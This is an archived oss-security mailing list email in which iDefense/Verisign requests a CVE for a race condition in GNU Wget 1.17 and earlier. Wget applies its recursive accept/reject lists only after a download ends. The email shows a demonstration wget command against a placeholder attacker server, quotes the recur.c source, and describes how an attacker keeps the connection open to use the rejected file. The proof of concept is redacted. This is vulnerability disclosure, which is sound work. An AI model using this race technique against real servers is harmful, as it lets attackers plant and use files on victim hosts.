X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6252" "Thursday" "11" "August" "2016" "21:11:56" "+0000" "Misra, Deapesh" "dmisra@verisign.com" "<F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>" "168" "[oss-security] CVE Request - Gnu Wget 1.17 - Design Error Vulnerability" nil nil nil "8" "2016081121:11:56" "[oss-security] CVE Request - Gnu Wget 1.17 - Design Error Vulnerability" (number mark "U       dmisra@veris Aug 11  168/6252  " thread-indent "\"[oss-security] CVE Request - Gnu Wget 1.17 - Design Error Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7681 invoked by uid 550); 12 Aug 2016 02:11:42 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18086 invoked from network); 11 Aug 2016 21:12:11 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=verisign-com.20150623.gappssmtp.com; s=20150623;
        h=from:to:cc:subject:thread-topic:thread-index:date:message-id
         :accept-language:content-language:content-transfer-encoding
         :mime-version;
        bh=FxXzhy7MC0aX1kLs1G83ojocK4daTVwrvFFLejR5b7k=;
        b=XcKMgznKmMCr679533lLzXNqRfE5d12wrVbVRZxerZVvKlF8cDYg8HzbWLdpM9VmZh
         9ynj6IdmSptmtqi/fCU6pwUbWbnIQHLSBeZBwroTzfme0HOV/CVlljbPA4w6zenv+mjZ
         1829ix1Tgu1wQRvgyzWr88oeVzoZ3R9Yu6Sz2MPaTmBSzWPf6S6TmmFqzS632+FTMuw/
         8ItxzJvxo8I1lLQcAeY1Pd4WIqT8zlUt2azWbvoLUcvDynQvoNIRxPbgqe19bPen6AOD
         eGWFHbjmX+bZxEJQ3MhYEG1cOBSQJEKmXKuh5b/ZRsKD5bLdbFiEz3w26XiMB0WvUuPb
         n+Gw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:to:cc:subject:thread-topic:thread-index
         :date:message-id:accept-language:content-language
         :content-transfer-encoding:mime-version;
        bh=FxXzhy7MC0aX1kLs1G83ojocK4daTVwrvFFLejR5b7k=;
        b=VOVehReN/JZGBT7dwLCMblowwZs64RC4SQv76jXPNnihiMnc6JuUDCrAvwYYbwL/+1
         1IAzrAggei40joXm/jU/yE0AdJx2kfl2FlUZlqatlOI3rb8n9ur00gKr7copJDEK5eAh
         GN6t/CLsC6ErNTVtsYqNy7RmrWael667Xb5oSBCEvIpq0unY0iyLShJq+STPB5+MnTfi
         Nz9QX6OmjH+x5u8bbUe588cNBt531IupRW5lO/bbo00ie4U5nxQJJEkM4jG3T4gW3pb9
         tb55cyC645+qmzCuwira5COD5tniO53B2b1Un9XU0hxkH74Y0L5psc8mvUBFG4kiRyc4
         S9sw==
X-Gm-Message-State: AEkooutwU13DpQqKNr33UlNk8oKmw7cUwUDJGg5r6xnBWkKoNoWL8WEa8YcU7LT2O5wr3d0BhhV9eCuUo4OAYiyiHZM2TvPP
X-Received: by 10.55.5.17 with SMTP id 17mr13408072qkf.279.1470949919253;
        Thu, 11 Aug 2016 14:11:59 -0700 (PDT)
X-Relaying-Domain: verisign.com
From: "Misra, Deapesh" <dmisra@verisign.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
CC: "dawid@legalhackers.com" <dawid@legalhackers.com>,
        "bug-wget@gnu.org"
	<bug-wget@gnu.org>
Thread-Topic: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability
Thread-Index: AdH0FHmTbBUqcVEKSSiLw2onxQh3jA==
Date: Thu, 11 Aug 2016 21:11:56 +0000
Message-ID: <F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
x-originating-ip: [10.173.152.4]
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
Subject: [oss-security] CVE Request - Gnu Wget 1.17 - Design Error Vulnerability

Hi,

------------------
- Background -
------------------

Here at iDefense, Verisign Inc, we have a Vulnerability Contributor Program=
 (VCP) where we buy vulnerabilities.=20

Recently, security researcher Dawid Golunski sold us an interesting vulnera=
bility within Wget. We asked Red Hat (secalert at redhat dot com) if they w=
ould help us with the co-ordination (patching, disclosure, etc) of this vul=
nerability. Once they graciously accepted, we discussed the vulnerability w=
ith them. After their initial triage, Red Hat recommended that we publicly =
post the details of this vulnerability to this mailing list for further dis=
cussion and hence this email.

----------
- Title -
----------

Wget Race Condition Recursive Download Accesslist Race Condition Vulnerabil=
ity

------------------------
-  Vulnerable Version  -
------------------------

GNU Wget <=3D 1.17       Race Condition / Access-list Bypass

-------------------
-  Vulnerability  -
-------------------

When wget is used in recursive/mirroring mode, according to the manual it c=
an take the following access list options:

"Recursive Accept/Reject Options:
  -A acclist --accept acclist
  -R rejlist --reject rejlist

Specify comma-separated lists of file name suffixes or patterns to accept o=
r reject. Note that if any of the wildcard characters, *, ?, [ or ], appear=
 in an element of acclist or rejlist, it will be treated as a pattern, rath=
er than a suffix."

These can for example be used to only download JPG images.=20

The vulnerability surfaces when wget is used to download a single file with=
 recursive option (-r / -m) and an access list ( -A ), wget only applies th=
e list at the end of the download process.=20

This can be observed on the output below:

	# wget -r -nH -A '*.jpg' http://attackers-server/test.php
	Resolving attackers-server... 192.168.57.1
	Connecting to attackers-server|192.168.57.1|:80... connected.
	HTTP request sent, awaiting response... 200 OK
	Length: unspecified [text/plain]
	Saving to: 'test.php'

	15:05:46 (27.3 B/s) - 'test.php' saved [52]

	Removing test.php since it should be rejected.

	FINISHED


Although the file get successfully deleted in the end, this creates a race =
condition situation as an attacker who has control over the URL, could slow=
 down the download process so that he had a chance to make use of the malic=
ious file before it gets deleted.


It is very easy for an attacker to win this race as the file only gets dele=
ted after the HTTP connection is terminated. He can therefore keep the conn=
ection open as long as necessary to make use of the uploaded file.  Below i=
s proof of concept exploit that demonstrates this technique.=20=20


----------------------
-  Proof of Concept  -
----------------------

< REDACTED BY iDefense FOR THE TIME BEING >

-------------------
-  Discussion  -
-------------------

=46rom the wget manual:

https://access.redhat.com/security/team/contact

> Finally, it's worth noting that the accept/reject lists are matched twice=
 against downloaded files: once against the URL's filename portion, to dete=
rmine if the file should be downloaded in the first place; then, after it h=
as been accepted and successfully downloaded, the local file's name is also=
 checked against the accept/reject lists to see if it should be removed. Th=
e rationale was that, since '.htm' and '.html' files are always downloaded =
regardless of accept/reject rules, they should be removed after being downl=
oaded and scanned for links, if they did match the accept/reject lists. How=
ever, this can lead to unexpected results, since the local filenames can di=
ffer from the original URL filenames in the following ways, all of which ca=
n change whether an accept/reject rule matches:=20


and from the source code, in file recur.c:

      if (file
          && (opt.delete_after
              || opt.spider /* opt.recursive is implicitely true */
              || !acceptable (file)))
        {
          /* Either --delete-after was specified, or we loaded this
             (otherwise unneeded because of --spider or rejected by -R)
             HTML file just to harvest its hyperlinks -- in either case,
             delete the local file. */
          DEBUGP (("Removing file due to %s in recursive_retrieve():\n",
                   opt.delete_after ? "--delete-after" :
                   (opt.spider ? "--spider" :
                    "recursive rejection criteria")));
          logprintf (LOG_VERBOSE,
                     (opt.delete_after || opt.spider
                      ? _("Removing %s.\n")
                      : _("Removing %s since it should be rejected.\n")),
                     file);
          if (unlink (file))
            logprintf (LOG_NOTQUIET, "unlink: %s\n", strerror (errno));
          logputs (LOG_VERBOSE, "\n");
          register_delete_file (file);
        }


it is evident that the accept/reject rule is applied only after the downloa=
d. This seems to be a design decision which has a security aspect to it. As=
 discussed above,=20
   - an attacker can ensure that the files which were not meant to be downl=
oaded are downloaded to the location on the victim server (which should be =
a publicly accessible location)=20
   - the attacker can keep the connection open, even if the file/s have bee=
n downloaded on the victim server
   - the attacker can then access these files OR use them in a separate att=
ack
   - the victim server's security is impacted since the developer/administr=
ator was never warned explicitly that 'rejected files' can have a transient=
 life on the victim server


It looks like the design for wget needs to be changed so that the file it d=
ownloads to 'recursively search' through is not saved in a location which i=
s accessible by the attacker. Additionally the documentation needs to be en=
hanced with the explicit mention of the 'transient nature' of the files whi=
ch are to be rejected.


We welcome your comments/suggestions.

thanks,

Deapesh.
iDefense Labs, Verisign Inc.
http://www.verisign.com/en_US/security-services/security-intelligence/vulne=
rability-reports/index.xhtml

PS: I hope the maintainer Giuseppe Scrivano gets to see this via the bug-wg=
et list I have CC-ed.

